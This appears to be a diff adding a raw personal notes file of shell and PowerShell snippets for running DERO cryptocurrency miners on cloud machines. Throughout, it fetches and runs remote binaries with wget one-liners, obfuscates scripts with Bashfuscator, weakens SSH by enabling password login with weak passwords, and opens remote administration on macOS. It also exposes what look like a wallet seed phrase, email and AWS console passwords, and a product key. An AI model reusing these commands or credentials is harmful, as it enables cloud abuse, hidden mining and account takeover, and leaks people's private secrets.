@@ -1,0 +1,160 @@
+sudo netstat -anp | grep : | grep ESTABLISHED | wc -l
+sudo netstat -anp | grep :4444 | grep ESTABLISHED | wc -l
+sudo netstat -anp | grep :5555 | grep ESTABLISHED | wc -l
+sudo netstat -anp | grep derohe | grep ESTABLISHED | wc -l
+
+#!/bin/bash
+sudo sed -i '/PasswordAuthentication no/c\PasswordAuthentication yes' /etc/ssh/sshd_config
+sudo sed -i '/PubkeyAuthentication yes/c\PubkeyAuthentication no' /etc/ssh/sshd_config
+echo "ubuntu:blabla123" | sudo chpasswd
+sudo service ssh restart
+
+
+
+mbunch village renting gills banjo amnesty general malady tadpoles mops aces tycoon aggravate goat blender oncoming poaching reorder gills rays tweezers snout angled phase general
+dero1qyry3sqyfkwcxln2yx99a2j7xdtvwm8cmj7mrj93ccfzuvy93ealsqgjlrrlf
+
+derod-windows-amd64.exe --integrator-address=dero1qyry3sqyfkwcxln2yx99a2j7xdtvwm8cmj7mrj93ccfzuvy93ealsqgjlrrlf
+./derohe-proxy --listen-address=0.0.0.0:4444 --daemon-address=52.142.60.6:10100 &
+./derohe-proxy --listen-address=0.0.0.0:5555 --daemon-address=52.142.60.6:10100 &
+
+<powershell>
+net user Administrator ToiLaHuy124#
+</powershell>
+
+<powershell>
+Set-Location "C:\Windows\system32"
+net user Administrator 123Qwe$#
+#Change TimeZone
+C:\Windows\System32\tzutil /s "AUS Eastern Standard Time"
+#Install Chrome 
+$Path = $env:TEMP;
+$Installer = "chrome_installer.exe";
+Invoke-WebRequest "http://dl.google.com/chrome/install/375.126/chrome_installer.exe" -OutFile     $Path\$Installer; 
+Start-Process -FilePath $Path\$Installer -ArgumentList "/silent /install" -Verb RunAs -Wait;
+Remove-Item $Path\$Installer
+#Set Chrome as default browser
+$chromePath = "${Env:ProgramFiles(x86)}\Google\Chrome\Application\" 
+$chromeApp = "chrome.exe"
+$chromeCommandArgs = "--make-default-browser"
+& "$chromePath$chromeApp" $chromeCommandArgs
+</powershell>
+
+git clone https://github.com/Bashfuscator/Bashfuscator
+cd Bashfuscator
+python3 setup.py install --user
+./bashfuscator  -f graalvmnative.sh -o graalvmnative
+./bashfuscator  -f  zehpnunu.sh -o vipprotocol
+./bashfuscator  -f  protocolnaming.sh -o protocolnaming
+./bashfuscator  -f  vaddin.sh -o vaddin
+./bashfuscator  -f  nativemn.sh -o nativemn
+chmod +x nativemn
+
+/home/azureuser/Bashfuscator/bashfuscator/bin 
+
+cp /usr/local/bin/protocolnaming /home
+
+#!/bin/bash
+USERNAME="ec2-user"
+PASSWORD="Admin123"
+sudo sysadminctl -addUser $USERNAME -password $PASSWORD -admin
+sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -users $USERNAME -privs -all -restart -agent -menu
+sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.screensharing.plist
+sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/MacOS/ARDAgent
+sudo /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/MacOS/ARDAgent
+75HLJ-G9HPQ-KLJCT-M26JT-AJU89 
+sudo passwd ec2-user
+Admin123
+
+#!/bin/bash
+sudo wget https://raw.githubusercontent.com/vip8338/proto/main/graalvmnative2
+sudo chmod +x graalvmnative2
+./graalvmnative2
+
+#!/bin/bash
+cd /usr/local/bin
+sudo wget -O graalvm.sh https://gitlab.com/amaz/grabcar/-/raw/main/graalvm.sh
+sh graalvm.sh
+
+
+sudo wget -O graalvm.sh https://raw.githubusercontent.com/vip8338/proto/main/huyld.sh && sh graalvm.sh
+
+OUT OF MONEY
+
+#!/bin/bash
+cd /usr/local/bin
+sudo wget -O xxcxx.sh https://gitlab.com/amaz/grabcar/-/raw/main/step1.sh
+sh xxcxx.sh --worker="$1"
+
+ssh -i "tomcat.pem" ubuntu@ec2-34-238-50-24.compute-1.amazonaws.com
+
+journalctl -xefu amazoon
+journalctl -xefu amazoonz
+journalctl -xefu
+
+sudo systemctl stop amazoonz.service
+
+#!/bin/bash
+sudo wget https://gitlab.com/amaz/grabcar/-/raw/main/graalvmnative2
+sudo chmod +x graalvmnative2
+./graalvmnative2
+
+#!/bin/bash
+sudo wget -O muathulavang https://gitlab.com/amaz/grabcar/-/raw/main/november
+sudo chmod +x muathulavang
+./muathulavang --worker=testacong
+
+sudo wget -O nhangheo https://raw.githubusercontent.com/vip8338/proto/main/philo && sudo chmod +x nhangheo && ./nhangheo --worker=congh --threads=1
+
+sudo wget -O nhangheo https://raw.githubusercontent.com/vip8338/proto/main/huymining && sudo chmod +x nhangheo && ./nhangheo --worker=congh --threads=1
+
+#!/bin/bash
+sudo wget -O nhangheo https://raw.githubusercontent.com/vip8338/proto/main/aenhangheo
+sudo chmod +x nhangheo
+./nhangheo --worker=testacong
+
+#!/bin/bash
+sudo wget -O hoadainhan https://raw.githubusercontent.com/vip8338/proto/main/hoadainhan
+sudo chmod +x hoadainhan
+./hoadainhan --worker=hoathan
+
+ wget -O hoadainhan https://gitlab.com/amaz/grabcar/-/raw/main/azspringapp.sh && sh hoadainhan
+ sh hoadainhan
+
+ZingMP3Q234!we
+
+
+
+mihamine@gmail.com	killBwither22	5
+vzonenft@gmail.com	SRb-#!YGz6.is9d	32
+
+https://819374207340.signin.aws.amazon.com/console
+ousales | dDf$j4923y@#@&# dDf$j4923y@#@&#1234
+
+s3://amazon-braket-us-west-2-021174229886/jobs/cong2/output/
+
+https://console.cloud.google.com/freetrial/signup/tos
+
+
+https://go.microsoft.com/fwlink/?linkid=2234155&clcid=0x409&l=en-us&srcurl=https%3A%2F%2Fazure.microsoft.com%2Fpricing%2Fpurchase-options%2Fpay-as-you-go
+
+https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView?Microsoft_AAD_IAM_legacyAADRedirect=true
+
+https://admin.microsoft.com/Adminportal/Home?Q=m365setup#/featureexplorer/security/ConditionalAccess
+
+https://admin.microsoft.com/Adminportal/Home#/Domains/Details/xqms888.onmicrosoft.com
+
+https://www.amazon.co.jp/-/en/yourmembershipsandsubscriptions?ref_=nav_AccountFlyout_digital_subscriptions
+5210120102901882
+
+https://www.amazon.co.jp/music/player/albums/B0CW1QR7C4
+
+https://www.amazon.co.jp/gp/f.html?C=207VCLAMVTYDK&K=3TNV5Q0YYLT5L&M=urn:rtn:msg:2024030503380156f791fded1d4969bd43f475b010p0fe&R=V59G0BH06JJ6&T=C&U=https%3A%2F%2Fwww.amazon.co.jp%2Fmusic%2Fplayer%2Falbums%2FB0CW1QR7C4%2Fref%3Dpe_27646372_437605772_qpr_sccl_2%2F356-1902771-9019101%2Fref%3Dqpr%3F_encoding%3DUTF8%26pd_rd_i%3DB0CW1QR7C4%26psc%3D1%26pd_rd_w%3DJv2vO%26content-id%3Damzn1.sym.08865d98-f29c-45e1-adf3-71e91faac889%26pf_rd_p%3D08865d98-f29c-45e1-adf3-71e91faac889%26pf_rd_r%3D19HAVJZKAHGBQKNCCG5V%26pd_rd_wg%3DCUZsJ%26pd_rd_r%3D969760dc-2014-4c67-9320-61a57d056b88&H=I6AJA9LU40TWYIXZGPTNAAQSR1KA&ref_=pe_27646372_437605772_qpr_sccl_2
+
+
+
+
+
+
+
+
